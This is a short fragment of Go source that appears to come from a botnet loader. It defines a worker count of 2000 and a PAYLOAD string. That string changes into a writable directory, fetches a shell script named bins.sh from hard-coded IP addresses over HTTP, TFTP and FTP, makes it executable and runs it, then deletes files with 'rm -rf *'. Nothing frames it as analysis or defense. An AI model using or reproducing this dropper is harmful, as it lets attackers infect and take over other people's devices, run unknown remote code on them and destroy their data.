...
const (
	...
	MAX_WORKERS       = 2000
	PAYLOAD           = "echo cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.16.162.140:81/hiddenbin/bins.sh; curl -O http://5.16.162.140:81/hiddenbin/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 91.208.184.248 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r bins.sh -g 5.16.162.140; chmod 777 bins.sh; sh bins.sh; ftpget -v -u anonymous -p anonymous -P 21 5.16.162.140 bins.sh bins.sh; sh bins.sh; rm -rf bins.sh bins.sh bins.sh; rm -rf *"
